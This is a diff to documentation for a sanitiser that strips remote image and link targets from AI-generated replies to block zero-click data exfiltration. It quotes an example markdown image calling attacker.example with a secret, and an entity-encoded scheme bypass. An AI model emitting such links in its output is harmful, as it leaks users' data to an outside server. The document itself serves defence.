@@ -164,7 +164,10 @@ embedding app that renders the reply cannot be made to call another server on
 render — a zero-click exfiltration channel through an image, for example
 `![](https://attacker.example/?d=secret)`. It rewrites every remote markdown
 image and link target, and every remote HTML `src`/`href`, to `#`. A target
-relative to the site (`/files/x.png`) passes through unchanged.
+relative to the site (`/files/x.png`) passes through unchanged. The check reads a
+target as a browser does: it accepts double quotes, single quotes, or no quotes, decodes
+HTML entities (`&#104;ttps:`), and removes spaces and control characters before it reads
+the scheme. Its patterns run in linear time, so a long reply cannot stall the worker.
 
 It is a text pass, not a full markdown or HTML parser: a markdown *reference*
 definition, or an HTML attribute other than `src`/`href`, is not covered. It fails
